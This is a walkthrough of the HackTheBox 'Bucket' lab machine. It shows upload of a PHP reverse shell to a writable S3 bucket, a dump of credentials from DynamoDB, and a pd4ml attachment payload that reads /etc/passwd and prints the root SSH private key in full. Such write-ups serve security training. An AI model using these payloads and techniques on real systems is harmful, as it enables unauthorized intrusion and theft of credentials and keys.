---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: aws bucket s3 awscli reverseshell php dynamodb portforwarding pd4ml fileread id_rsa 
---

<br />

![1](../../../assets/images/Bucket/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />

Hello hackers! Today we’ll tackle the Bucket machine, a Medium Difficulty Linux challenge. We start by enumerating an S3 bucket accessible via AWS CLI and discover that not only can we list files, but we also have write permissions. Uploading a PHP reverse shell grants us initial access as www-data. From there, we enumerate a local DynamoDB instance and dump credentials to pivot to the roy user. Further enumeration reveals a locally hosted web app, which we access through SSH port forwarding. By leveraging its integration with DynamoDB and a PDF generation function, we exploit file read capabilities in the PDF export feature to retrieve the root SSH private key and finally gain root access to the machine.

<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.10.212 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 19:33 CEST
Nmap scan report for 10.10.10.212
Host is up (0.041s latency).
Not shown: 65221 closed tcp ports (reset), 312 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://bucket.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.65 seconds
```

<br />

Open Ports:

- `Port 22` -> ssh

- `Port 80` -> http

<br />

# Http Enumeration: -> Port 80

<br />

Visiting the website returns a `302 found` status code, redirecting to `bucket.htb`.

So, we add it to the `/etc/hosts` and we can list its contents:

<br />

![2](../../../assets/images/Bucket/2.png)

<br />

The page is completely `static` and doesn't have any function, only some hacking articles, but inspecting the `source code` we found something:

<br />

![3](../../../assets/images/Bucket/3.png)

<br />

## Amazon S3 Bucket:

<br />

It's an `Amazon S3 Bucket` subdomain!!

The site uses a bucket to `store` the images of the articles we saw earlier and most likely the rest of its `resources` as well.

<br />

![4](../../../assets/images/Bucket/4.png)

<br />

When we access the base URL, it shows the typical `"status: running"` message:

<br />

![5](../../../assets/images/Bucket/5.png)

<br />

If we do some `research` on Google we can discover how to `enumerate` a bucket with `aws cli`.

To do it, the first thing, is to `configure` this tool:

<br />

```bash
❯ aws configure
AWS Access Key ID [None]: test
AWS Secret Access Key [None]: test
Default region name [None]: us-east-1
Default output format [None]: test
```

<br />

Now we can start enumerating the available `buckets`:

<br />

```bash
❯ aws s3 ls s3:// --endpoint-url=http://s3.bucket.htb
2025-04-11 20:28:03 adserver
```

<br />

There is only one bucket on this server called `"adserver"`.

With the following command, we can see its contents:

<br />

```bash
❯ aws s3 ls s3://adserver --endpoint-url=http://s3.bucket.htb
                           PRE images/
2025-04-11 20:30:04       5344 index.html
```

<br />

And if we add the `--recursive` flag, we can see the files inside the `"images"` directory:

<br />

```bash
❯ aws s3 ls s3://adserver --endpoint-url=http://s3.bucket.htb --recursive
2025-04-11 20:32:03      37840 images/bug.jpg
2025-04-11 20:32:03      51485 images/cloud.png
2025-04-11 20:32:04      16486 images/malware.png
2025-04-11 20:32:04       5344 index.html
```

<br />

Cool, we have `access` to the bucket and we can `list` it contents.

What if we try to `upload` something?

<br />

```bash
❯ echo "This is a test to probe if we have write permissions in this bucket :D" > test.txt
❯ aws s3 cp test.txt s3://adserver/test.txt --endpoint-url=http://s3.bucket.htb
upload: ./test.txt to s3://adserver/test.txt
```

<br />

Yes! We can upload `files`!

<br />

![6](../../../assets/images/Bucket/6.png)

<br />

At this point, we can try to upload a `malicious` PHP reverse shell and if the website allows PHP `execution`, we might gain access to the victim machine.

To do it, we can use the `php` reverse shell of [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) GitHub repository:

<br />

```bash
❯ aws s3 cp reverseshell.php s3://adserver/reverseshell.php --endpoint-url=http://s3.bucket.htb
upload: ./reverseshell.php to s3://adserver/reverseshell.php
```

<br />

Now we load the `reverse shell` page and check our listener:

<br />

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.212] 33860
Linux bucket 5.4.0-48-generic 52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:06:02 up  1:41,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br />

Perfect! We are in as `www-data`!

<br />

# Privilege Escalation: www-data -> roy

<br />

Once in the system, we start enumerating the user directory -> `/home/roy`:

<br />

```bash
www-data@bucket:/home/roy$ ls
project  user.txt
www-data@bucket:/home/roy$ cat user.txt
cat: user.txt: Permission denied
```

<br />

There is a directory named `"project"` and the user.txt flag, but we can't get it:

<br />

## DynamoDB Enumeration:

<br />

If we enter this directory, we can see some `files`, including a very interesting one with `useful` information:

<br />

```php
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
```

<br />

Aws is using a `DynamoDB` database!

<br />

![7](../../../assets/images/Bucket/7.png)

<br />

This database is hosted on `localhost:4566`, but since it's running on the same `AWS` service as the bucket, we can enumerate it from our attacking machine using the same `endpoint`.

We start listing the available `tables`:

<br />

```bash
❯ aws dynamodb list-tables --endpoint-url=http://s3.bucket.htb --output json
{
    "TableNames": [
        "users"
    ]
}
```

<br />

There is only one.

Using the `scan` option, we can `dump` its content:

<br />

```bash
❯ aws dynamodb scan --table-name users --endpoint-url=http://s3.bucket.htb --output json
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

<br />

Nice! We found several `passwords`.

Trying one by one, we finally get a good one that works to `roy` user:

<br />

```bash
❯ su roy
Password:
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ cat user.txt
0ac4bcc7594c64dd4822867183xxxxxx
```

<br />

## DynamoDB Shell:

<br />

There is another cool way to enum the `DynamoDB` database.

To do it, we need to access DynamoDB `shell` in the website -> `http://s3.bucket.htb/shell/`:

<br />

![10](../../../assets/images/Bucket/10.png)

<br />

The language of this shell is JavaScript and there are a lot of payloads that you can use to enumerate.

This one works for me:

<br />

```javascript 
const config = {};

function displayTables(err, data) {
    if (err) {
        console.error("Failed to list tables:");
        ppJson(err);
    } else {
        console.log("Available DynamoDB tables:");
        ppJson(data);
    }
}

dynamodb.listTables(config, displayTables);
```

<br />

# Privilege Escalation: roy -> root 

<br />

Continuing our enumeration, we use `"netstat"` and find an interesting port, the `8000` one:

<br />

```bash
roy@bucket:/var/www/bucket-app$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:39051         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:4566          127.0.0.1:39016         TIME_WAIT  
tcp        0      1 10.10.10.212:49992      1.0.0.1:53              SYN_SENT   
tcp        0      0 127.0.0.1:4566          127.0.0.1:39022         TIME_WAIT  
tcp        0    138 10.10.10.212:42778      10.10.14.15:443         ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 10.10.10.212:80         10.10.14.15:60726       ESTABLISHED
```

<br />

We can do a `Port Forwarding`:

<br />

```bash
❯ ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000
```

<br />

And list it:

<br />

![8](../../../assets/images/Bucket/8.png)

<br />

It is a simple website under construction.

But if we look `deeper`, we find the directory of this website under `/var` (bucket-app).

<br />

```bash
roy@bucket:/var/www$ ls -l
total 8
drwxr-x---+ 4 root root 4096 Feb 10  2021 bucket-app
drwxr-xr-x  2 root root 4096 Apr 11 23:21 html
```

<br />

User `roy` can access this directory.

This is interesting because even though the directory is owned by `root`, the permissions allow access to `roy` thanks to the extended `ACL` (+ sign), which means there may be readable or writable files useful for `privilege escalation`.

<br />

```bash
roy@bucket:/var/www/bucket-app$ ls -l
total 848
-rw-r-x---+  1 root root     63 Sep 23  2020 composer.json
-rw-r-x---+  1 root root  20533 Sep 23  2020 composer.lock
drwxr-x---+  2 root root   4096 Feb 10  2021 files
-rwxr-x---+  1 root root  17222 Sep 23  2020 index.php
-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
drwxr-x---+ 10 root root   4096 Feb 10  2021 vendor
```

<br />

At the top of `"index.php"`, we found an interesing code:

<br />

```php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
	if($_POST["action"]==="get_alerts") {
		date_default_timezone_set('America/New_York');
		$client = new DynamoDbClient([
			'profile' => 'default',
			'region'  => 'us-east-1',
			'version' => 'latest',
			'endpoint' => 'http://localhost:4566'
		]);

		$iterator = $client->getIterator('Scan', array(
			'TableName' => 'alerts',
			'FilterExpression' => "title = :title",
			'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
		));

		foreach ($iterator as $item) {
			$name=rand(1,10000).'.html';
			file_put_contents('files/'.$name,$item["data"]);
		}
		passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
	}
}
else
{
?>
```

<br />

A `POST` request with the action parameter set to `"get_alerts"` will configure a `DynamoDB` client for connect to localhost:4566 and scans the `"alerts"` table filtering by the title `"Ransonmware"`.

Finally it calls to `pd4ml` and creates a `PDF` with the table content.

<br />

## Testing Functionality:

<br />


To fully understand this `process`, we are going to go through it step by step.

Since the `alerts` table does not exist yet, we need to create it manually using the `AWS CLI` and with the structure we saw earlier in the `index.php` file.

With a little `research` on Google we found the necessary `documentation` and be able to do it with the following oneliner:

<br />

```bash
❯ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --table-class STANDARD --endpoint-url=http://s3.bucket.htb --output=json
{
    "TableDescription": {
        "AttributeDefinitions": [
            {
                "AttributeName": "title",
                "AttributeType": "S"
            }
        ],
        "TableName": "alerts",
        "KeySchema": [
            {
                "AttributeName": "title",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": "2025-04-12T17:31:31.366000+02:00",
        "ProvisionedThroughput": {
            "LastIncreaseDateTime": "1970-01-01T01:00:00+01:00",
            "LastDecreaseDateTime": "1970-01-01T01:00:00+01:00",
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 5,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
    }
}
```

<br />

The second step, is to insert the required `content` into the table.

After another little work of research, we found documentation to do it:

<br />

```bash
❯ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "Test to check the functionality"}}' --endpoint-url http://s3.bucket.htb --output text
CONSUMEDCAPACITY        1.0     alerts
```

<br />

Finally, we just need to make the `POST` request  to `localhost:8000` on the victim machine.

It's important to remember to include the `"action=get_alerts"` parameter in the request to trigger the function:

<br />

```bash
curl -s -X POST "localhost:8000" -d "action=get_alerts"
```

<br />

Now we check the `/files` directory to see if the `PDF` was created successfully:

<br />

```bash
roy@bucket:/var/www/bucket-app$ ls
composer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor
roy@bucket:/var/www/bucket-app$ cd files/
roy@bucket:/var/www/bucket-app/files$ ls
5813.html  result.pdf
```

<br />

Yes! Let's see its content:

<br />

![9](../../../assets/images/Bucket/9.png)

<br />

## Pdf4ml File Read:

<br />

While reading about the different `pdf4ml` functionalities, we found a really interesting one that allows us to `embed` a Linux `file` into the PDF.

The sintaxis to do that is this:

<br />

```bash
<pd4ml:attachment description=\"Testing to hard\" src=\"file://etc/passwd\"></pd4ml:attachment>"
```

<br />

After include this `payload` into our oneliner we can repeat the process:

<br />

```bash
aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --table-class STANDARD --endpoint-url=http://s3.bucket.htb --output=json && aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"Testing to hard\" src=\"file:/etc/passwd\"></pd4ml:attachment>"}}' --endpoint-url http://s3.bucket.htb --output json
```

<br />

Then we list the `/etc/passwd`:

<br />

```bash
ggff
FQ 0
:0f2
endstream
endobj
5 0 obj
/Size 1814
endobj
6 0 obj
	/Type /EmbeddedFile
/Length 1814
/Params 5 0 R
stream
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
```

<br />

To get a shell as root we change the `/etc/passwd` file to `/root/.ssh/id_rsa`:

<br />

```bash
ggff
FQ 0
:0f2
endstream
endobj
5 0 obj
/Size 2602
endobj
6 0 obj
	/Type /EmbeddedFile
/Length 2602
/Params 5 0 R
stream
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

<br />

Now we can use `ssh` to log into the system as `root`:

<br />

```bash
❯ ssh -i id_rsa root@10.10.10.212
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
...[snip]...
root@bucket:~# id
uid=0(root) gid=0(root) groups=0(root)
root@bucket:~# cat root.txt
6a9a266da683c1aae2a654ad08xxxxxx
```

<br />

Another Medium Machine from HackTheBox rooted!!

These were totally new concepts for me, and I learned a ton along the way. Hope you did too!☺️

Keep Hacking!!❤️❤️

<br />
